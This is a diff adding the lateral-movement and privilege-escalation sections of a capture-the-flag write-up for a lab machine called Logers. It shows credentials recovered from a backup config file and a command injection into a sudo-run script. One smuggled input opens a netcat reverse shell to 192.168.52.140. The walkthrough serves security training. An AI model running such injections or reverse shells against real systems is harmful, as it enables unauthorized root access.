@@ -426,3 +426,183 @@ www-data@logers
 
 At this point, arbitrary commands can be executed on the target system.
 
+# Lateral Movement
+
+## Enumerating the System
+
+After obtaining a shell as the `www-data` user, basic system enumeration is performed.
+
+```bash
+whoami
+id
+hostname
+```
+
+Output:
+
+```text
+www-data
+uid=33(www-data) gid=33(www-data)
+logers
+```
+
+The web root is inspected for configuration files that may contain credentials.
+
+```bash
+cd /var/backups/
+```
+
+During enumeration, a backup configuration file is discovered.
+
+```text
+/var/backups/config.php
+```
+
+![Configuration Backup](screenshots/20_backup_file.png)
+
+---
+
+## Recovering Credentials
+
+Opening the backup file reveals hardcoded credentials.
+
+```bash
+cat /var/backups/config.php
+```
+![Configuration Backup](screenshots/21_backup_file.png)
+
+Inside the file, SSH credentials for another user are present.
+
+```text
+logging
+superlogging
+```
+
+These credentials are intended to be discovered through local enumeration after compromising the web server.
+
+---
+
+## SSH Access
+
+Using the recovered credentials, authenticate over SSH.
+
+```bash
+ssh logging@logers.htb
+```
+![User Flag](screenshots/21_user_logging.png)
+
+After successful authentication:
+
+```text
+logging@logers:~$
+```
+
+The user flag can now be obtained.
+
+```bash
+cat ~/user.txt
+```
+
+![User Flag](screenshots/21_user_flag.png)
+
+At this point, a stable user shell has been established and the machine transitions into the privilege escalation phase.
+
+---
+
+# Privilege Escalation
+
+## Sudo Enumeration
+
+The first step is to determine whether the current user has any sudo privileges.
+
+```bash
+sudo -l
+```
+
+Output:
+
+```text
+User logging may run the following commands on logers:
+
+(root) NOPASSWD: /usr/local/bin/status_check.sh
+```
+
+![sudo -l](screenshots/22_sudo_l.png)
+
+This immediately highlights a custom script as the intended privilege escalation vector.
+
+---
+
+## Analyzing the Script
+
+View the script contents.
+
+```bash
+sudo /usr/local/bin/status_check.sh
+```
+
+Because user input is expanded directly by the shell, command injection becomes possible.
+
+This behavior forms the intended privilege escalation vulnerability.
+
+![Status Script](screenshots/23_status_script.png)
+
+---
+
+## Exploiting the Command Injection
+
+Execute the script.
+
+```bash
+sudo /usr/local/bin/status_check.sh
+```
+
+When prompted for the service name, inject an additional command.
+
+```text
+test; id
+```
+![Root Shell](screenshots/23_root_id.png)
+
+The injected command executes with root privileges.
+
+So Let's run this file again and this time we type **test; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.52.140 4343 >/tmp/f**
+
+A root shell is immediately spawned.
+
+```text
+root@logers:/home/logging#
+```
+
+![Root Shell](screenshots/24_root_shell.png)
+
+---
+
+## Obtaining the Root Flag
+
+Finally, read the root flag.
+
+```bash
+cat /root/root.txt
+```
+
+![Root Flag](screenshots/25_root_flag.png)
+
+---
+
+# Conclusion
+
+The intended attack path for **Logers** demonstrates a complete compromise of a Linux web server through realistic misconfigurations and insecure coding practices.
+
+The attack consists of:
+
+1. Enumerating the exposed HTTP service.
+2. Discovering the `logers.htb` virtual host.
+3. Enumerating the Emlog CMS installation.
+4. Recovering administrator credentials through an intentionally weak password.
+5. Exploiting the vulnerable plugin upload functionality to gain remote code execution.
+6. Enumerating the filesystem to recover SSH credentials from a backup configuration file.
+7. Establishing a stable SSH session as the `logging` user.
+8. Exploiting a custom command injection vulnerability in a privileged maintenance script to obtain root privileges.
+
+This machine emphasizes several practical skills commonly encountered during real-world web application assessments, including web enumeration, CMS exploitation, credential harvesting, Linux post-exploitation, and custom privilege escalation through insecure shell scripting.
